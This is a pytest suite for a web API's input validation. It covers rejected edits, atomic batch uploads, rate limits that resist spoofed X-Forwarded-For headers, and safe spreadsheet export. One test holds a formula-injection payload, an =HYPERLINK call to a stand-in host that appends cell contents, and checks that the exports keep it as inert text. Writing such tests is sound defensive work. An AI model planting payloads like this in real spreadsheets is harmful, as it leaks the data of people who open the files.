"""Bad input is refused with a 4xx before anything is stored (found in the overnight QA pass)."""

from __future__ import annotations

import io
from typing import Any

import pytest
from fastapi.testclient import TestClient
from PIL import Image

from app.main import app

PID = "demo-shivalik"


@pytest.fixture()
def client(mem_store: Any):  # noqa: ARG001
    with TestClient(app) as c:
        assert c.post("/api/demo/load", json={"replay": True, "shared": True}).status_code == 200
        yield c


def _jpeg() -> bytes:
    out = io.BytesIO()
    Image.new("RGB", (40, 60), "white").save(out, format="JPEG")
    return out.getvalue()


def test_a_run_mode_other_than_live_or_replay_is_refused(client: TestClient) -> None:
    r = client.post(f"/api/projects/{PID}/runs", json={"mode": "bogus"})
    assert r.status_code == 422
    assert not client.get(f"/api/projects/{PID}").json()["running"]


@pytest.mark.parametrize("bad", ["NaN", "Infinity", "-Infinity", "sNaN", "1e999999", "-5", "abc", "1e13"])
def test_an_edit_that_is_not_a_usable_quantity_changes_nothing(client: TestClient, bad: str) -> None:
    ev = next(e for e in client.get(f"/api/projects/{PID}/evidence").json() if e["field_key"] == "scrap_t" and e["status"] == "VERIFIED_2R")
    r = client.patch(f"/api/projects/{PID}/evidence/{ev['id']}", json={"action": "edit", "value_text": bad, "value_num": bad})
    assert r.status_code == 422
    after = next(e for e in client.get(f"/api/projects/{PID}/evidence").json() if e["id"] == ev["id"])
    assert (after["value_text"], after["value_num"], after["status"]) == (ev["value_text"], ev["value_num"], "VERIFIED_2R")
    # the project still recalculates: approving another value works
    amber = next(e for e in client.get(f"/api/projects/{PID}/evidence").json() if e["status"] == "NEEDS_REVIEW")
    assert client.patch(f"/api/projects/{PID}/evidence/{amber['id']}", json={"action": "approve"}).status_code == 200


def test_an_empty_edit_is_refused(client: TestClient) -> None:
    ev = next(e for e in client.get(f"/api/projects/{PID}/evidence").json() if e["status"] == "NEEDS_REVIEW")
    assert (
        client.patch(f"/api/projects/{PID}/evidence/{ev['id']}", json={"action": "edit", "value_text": "  ", "value_num": ""}).status_code
        == 422
    )
    assert next(e for e in client.get(f"/api/projects/{PID}/evidence").json() if e["id"] == ev["id"])["value_text"] == ev["value_text"]


@pytest.mark.parametrize("bad", ["NaN", "Infinity", "sNaN"])
def test_exchange_rate_and_price_must_be_finite(client: TestClient, bad: str) -> None:
    assert client.patch(f"/api/projects/{PID}", json={"fx_inr_per_eur": bad}).status_code == 422
    assert client.patch(f"/api/projects/{PID}", json={"projection_price_eur": bad}).status_code == 422


def test_one_unreadable_file_stores_none_of_the_batch(client: TestClient) -> None:
    own = client.post("/api/projects", json={"name": "x", "company": "Batch (SAMPLE)"}).json()["id"]
    files = [
        ("files", ("a.jpg", _jpeg(), "image/jpeg")),
        ("files", ("b.txt", b"hello", "text/plain")),
        ("files", ("c.jpg", _jpeg(), "image/jpeg")),
    ]
    assert client.post(f"/api/projects/{own}/documents", files=files).status_code == 415
    files[1] = ("files", ("b.jpg", b"not a jpeg", "image/jpeg"))
    assert client.post(f"/api/projects/{own}/documents", files=files).status_code == 422
    assert client.get(f"/api/projects/{own}").json()["documents"] == []
    files.pop(1)
    assert len(client.post(f"/api/projects/{own}/documents", files=files).json()["documents"]) == 2


def test_the_run_receipt_says_needs_for_one_value(client: TestClient) -> None:
    run = client.get(f"/api/projects/{PID}").json()["last_run"]
    events = client.get(f"/api/projects/{PID}/runs/{run['id']}").json()["events"]
    summary = next(e["output_summary"] for e in events if e["agent"] == "SecondReader" and "agree" in (e["output_summary"] or ""))
    assert summary.endswith(", 1 needs review")


def test_a_made_up_forwarded_for_header_does_not_reset_the_caps(mem_store: Any) -> None:  # noqa: ARG001
    """Cloud Run appends the caller's real address last; a client-sent first entry must not count."""
    from app.api import routes

    routes._unlock_log.clear()
    with TestClient(app) as c:
        own = c.post("/api/projects", json={"name": "x", "company": "Caps (SAMPLE)"}).json()["id"]
        codes = [
            c.post(
                f"/api/projects/{own}/unlock", json={"passcode": "WRONG"}, headers={"X-Forwarded-For": f"10.0.0.{i}, 198.51.100.7"}
            ).status_code
            for i in range(21)
        ]
        assert codes[:20] == [401] * 20 and codes[20] == 429
        assert routes.client_ip("203.0.113.5, 198.51.100.7", "10.1.1.1") == "198.51.100.7"
        assert routes.client_ip("", "10.1.1.1") == "10.1.1.1"
    routes._unlock_log.clear()


def test_text_that_excel_would_run_is_exported_as_text(client: TestClient) -> None:
    """A value read from a photo (or a name typed by a person) that starts with "=" must not become a
    formula in the workbook or the verifier pack's CSV files, which verifiers open in Excel."""
    import csv
    import zipfile

    import openpyxl

    ev = next(e for e in client.get(f"/api/projects/{PID}/evidence").json() if e["status"] == "NEEDS_REVIEW")
    bad = '=HYPERLINK("http://example.invalid/?x="&A1,"open")'
    edit = {"action": "edit", "value_text": bad, "value_num": "15.4", "user": "=1+1"}
    assert client.patch(f"/api/projects/{PID}/evidence/{ev['id']}", json=edit).status_code == 200
    wb = openpyxl.load_workbook(io.BytesIO(client.get(f"/api/projects/{PID}/export/xlsx").content))
    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
    assert not [c.coordinate for c in cells if c.data_type == "f"]
    assert any(c.value == bad for c in cells)  # kept, as text
    z = zipfile.ZipFile(io.BytesIO(client.get(f"/api/projects/{PID}/export/pack").content))
    for name in (n for n in z.namelist() if n.endswith(".csv")):
        for row in csv.reader(io.StringIO(z.read(name).decode("utf-8-sig"))):
            assert not [v for v in row if v[:1] in ("=", "@", "+")], name
